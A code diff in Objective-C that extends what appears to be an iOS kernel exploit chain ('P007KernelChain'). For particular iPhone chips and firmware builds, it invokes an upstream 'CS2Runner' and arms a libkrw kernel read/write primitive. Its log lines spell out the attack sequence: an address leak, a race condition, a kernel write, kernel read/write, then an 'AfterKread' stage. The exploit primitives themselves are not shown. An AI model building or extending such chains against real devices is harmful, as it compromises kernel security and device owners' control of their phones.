@@ -12,13 +12,15 @@
 #import "P044AksKaslrReach.h"
 #import "P114SurfaceLeak.h"
 #import "P007Board.h"
+#import "P007KreadLane.h"
+#import "ClearSword/CS2Runner.h"
 #import "lumina_core.h"
 
 #include <fcntl.h>
 #include <string.h>
 #include <unistd.h>
 
-#define KRW_BUILD @"path-test-2"
+#define KRW_BUILD @"path-test-3"
 
 @implementation P007KernelChain
 
@@ -93,8 +95,23 @@
         NSString *r114 = [LabPathTest scoreLog:p114 forPath:@"p114"];
         [LabLearn recordPath:@"p114" result:r114 evidence:@"KERNEL P114"];
         L([NSString stringWithFormat:@"PATH_TEST id=p114 class=disclosure result=%@", r114]);
-    } else if (sku == LabSkuA14_21D50) {
-        L(@"[*] 12 mini: 43748 not live. Occupancy SKIP. kread via libkrw/CS2.");
+    } else if (sku == LabSkuA14_21D50 || sku == LabSkuA13_22G100) {
+        L(@"[*] 12 mini / A13: 43748 not live. KRW door is CS2 then libkrw.");
+        P007Board *bb = [P007Board shared];
+        if (!bb.hasKread) {
+            NSString *cs = nil;
+            @try { cs = [CS2Runner runUpstream]; }
+            @catch (NSException *e) { L([NSString stringWithFormat:@"[-] cs2 %@", e.name]); }
+            if (cs.length) {
+                NSUInteger n = cs.length > 240 ? 240 : cs.length;
+                L([cs substringToIndex:n]);
+            }
+        }
+        if (!bb.hasKread) {
+            bool armed = P007LaneArmBoard();
+            L([NSString stringWithFormat:@"[*] libkrw P007LaneArmBoard %@",
+               armed ? @"YES" : @"miss (stock / no provider)"]);
+        }
     } else {
         L([NSString stringWithFormat:@"[*] no occupancy door on %@", skuName]);
     }
@@ -111,6 +128,14 @@
        b.hasKread ? @"YES" : @"NO", (unsigned long long)b.kbase]);
     L(@"=== KERNEL T1 END ===");
     L(@"[*] Occupancy CLASS / P139 harvest / P114 REACH are not hasKread.");
+    if (sku == LabSkuA14_23F77) {
+        L(@"[*] hunt FORMULA: P044 N=192 occupancy → conversion unnamed → SocketKRW.Arm → kread32. P110/P142 catalog-solo.");
+    } else if (sku == LabSkuT8150_24A435 || sku == LabSkuT8150_other) {
+        L(@"[*] 17 FORMULA: leak(P114) → race(P110 catalog-solo) → write(P142 catalog-solo) → krw(unnamed) → sptm(HOLD)");
+        L(@"[*] Family-B / P142 panic is write-class, not kread32. AfterKread HOLD.");
+    } else if (sku == LabSkuA14_21D50 || sku == LabSkuA13_22G100) {
+        L(@"[*] 12 mini / A13 FORMULA: CS2/libkrw → kread32 → AfterKread FIRE. Staging files ≠ jailbreak.");
+    }
 
     if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
     return acc;
